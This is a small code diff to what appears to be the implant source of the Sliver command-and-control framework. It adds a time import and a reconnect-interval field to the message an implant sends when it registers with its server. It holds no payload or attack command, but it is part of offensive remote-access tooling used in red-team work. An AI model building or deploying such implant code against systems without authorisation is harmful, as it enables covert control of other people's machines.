@@ -28,6 +28,7 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"time"
 
 	// {{if .Debug}}{{else}}
 	"io/ioutil"
@@ -251,6 +252,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 		Pid:      int32(os.Getpid()),
 		Filename: filename,
 		ActiveC2: transports.GetActiveC2(),
+		ReconnectInterval: uint32(transports.GetReconnectInterval()/time.Second),
 	})
 	if err != nil {
 		// {{if .Debug}}
